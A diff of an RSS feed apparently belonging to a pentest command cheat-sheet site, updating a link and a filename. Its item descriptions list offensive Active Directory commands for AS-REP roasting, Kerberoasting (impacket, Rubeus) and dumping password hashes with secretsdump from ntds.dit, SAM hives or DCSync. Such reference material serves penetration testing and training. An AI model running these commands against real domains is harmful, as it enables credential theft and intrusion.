@@ -16,9 +16,9 @@
     </item>
     <item>
       <title>Kerberoasting</title>
-      <link>https://tldrbins.github.io/asp-roasting/</link>
+      <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/asp-roasting/</guid>
+      <guid>https://tldrbins.github.io/roasting/</guid>
       <description> AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request &amp;#39;example.com/user:password&amp;#39; -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos&#xA;Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password </description>
     </item>
     <item>
@@ -47,7 +47,7 @@
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
   </channel>
 </rss>
